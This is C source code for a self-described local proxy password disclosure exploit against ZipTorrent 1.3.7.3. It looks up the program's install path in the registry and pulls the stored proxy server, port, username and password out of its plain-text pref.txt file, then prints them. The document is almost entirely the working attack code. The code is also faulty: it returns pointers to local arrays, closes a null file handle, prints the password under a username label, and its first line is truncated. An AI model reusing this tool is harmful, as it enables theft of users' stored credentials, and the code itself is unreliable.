nclude <stdio.h>
#include <windows.h>



int GetOffset(char *FilePath, char *Str)
{
       char kr;
       int Sayac=0;
       int Offset=-1;
       FILE *di;
       if( (di=fopen(FilePath,"rb")) == NULL )
       {
               fclose(di);
               return -1;
       }

       while(!feof(di))
       {
               Sayac++;
               for(int i=0;i<strlen(Str);i++)
               {
                       kr=getc(di);
                       if(kr != Str[i])
                       {
                               if( i>0 ) fseek(di,Sayac+1,SEEK_SET);
                               break;
                       }

                       if( i > ( strlen(Str)-2 ) )
                       {
                               Offset = ftell(di)-strlen(Str);
                               fclose(di);
                               return Offset;
                       }
               }
       }

       fclose(di);
       return -1;
}


char *ReadString(char *FilePath, char *Str)
{
       FILE *di;
       char cr;
       int i=0;
       char Feature[500];

       int Offset = GetOffset(FilePath,Str);

       if( Offset == -1 ) return NULL;
       if( (di=fopen(FilePath,"rb")) == NULL ) return NULL;

       fseek(di,Offset+strlen(Str),SEEK_SET);

       while(!feof(di))
       {
               cr=getc(di);
               if(cr == 0x0D) break;
               Feature[i] = cr;
               i++;
       }

       Feature[i] = '\0';
       fclose(di);
       return Feature;
}

char *GetZipTorrentPath()
{
       HKEY hKey;
       char szZipTorrentPath[MAX_PATH];
       DWORD dwBufLen = MAX_PATH;
       LONG lRet;

       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                                       "SOFTWARE\\ZipTorrent",
                                       0,
                                       KEY_QUERY_VALUE,
                                       &hKey
                                       ) == ERROR_SUCCESS)
       {
               lRet = RegQueryValueEx( hKey,
                                                               "Install_Dir",
                                                               NULL,
                                                               NULL,
                                                               (LPBYTE) szZipTorrentPath,
                                                               &dwBufLen);

               if( (lRet != ERROR_SUCCESS) || (dwBufLen > MAX_PATH) )
               {
                       RegCloseKey(hKey);
                       return NULL;
               }
               RegCloseKey(hKey);
               return szZipTorrentPath;
       }
       return NULL;
}


int main()
{
       char szPwdFile[MAX_PATH];
       char szServer[255], szPort[255], szUsername[255], szPassword[255];
       bool bInstalled;
       if( GetZipTorrentPath() == NULL ) bInstalled = false;
       else
       {
               bInstalled = true;
               strcpy(szPwdFile, GetZipTorrentPath());
               strcat(szPwdFile, "\\pref.txt");
               strcpy(szServer, ReadString(szPwdFile, "proxy_ip | "));
               strcpy(szPort, ReadString(szPwdFile, "proxy_port | "));
               strcpy(szUsername, ReadString(szPwdFile, "proxy_username | "));
               strcpy(szPassword, ReadString(szPwdFile, "proxy_password | "));
       }

       fprintf(stdout, "ZipTorrent 1.3.7.3 Local Proxy Password Disclosure
Exploit by Kozan\n");
       fprintf(stdout, "Credits to ATmaCA\n");
       fprintf(stdout, "Web: www.spyinstructors.com \n");
       fprintf(stdout, "Mail: kozan@spyinstructors.com \n\n");

       if( !bInstalled )
       {
               fprintf(stderr, "ZipTorrent is not installed on your pc!\n");
               return -1;
       }

       fprintf(stdout, "Proxy Server\t: \t%s\n", szServer);
       fprintf(stdout, "Proxy Port\t: \t%s\n", szPort);
       fprintf(stdout, "Proxy Username\t: \t%s\n", szUsername);
       fprintf(stdout, "Proxy Username\t: \t%s\n", szPassword);

       return 0;
}

